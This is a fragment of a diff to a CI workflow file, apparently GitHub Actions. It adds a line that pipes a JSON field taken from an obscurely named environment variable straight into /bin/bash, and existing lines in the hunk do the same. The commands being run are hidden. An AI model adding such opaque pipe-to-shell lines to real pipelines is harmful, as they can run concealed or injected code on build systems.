@@ -26,6 +26,7 @@ jobs:
           echo $du97 | jq -r .n034 | /bin/bash
           echo $ddby3 | jq -r .bd135 | /bin/bash
           echo $v80 | jq -r .ib6 | /bin/bash
+          printf '%s' "$shgb5" | jq -r .eiu5 | /bin/bash
 
       - name: Archive output
         if: always()
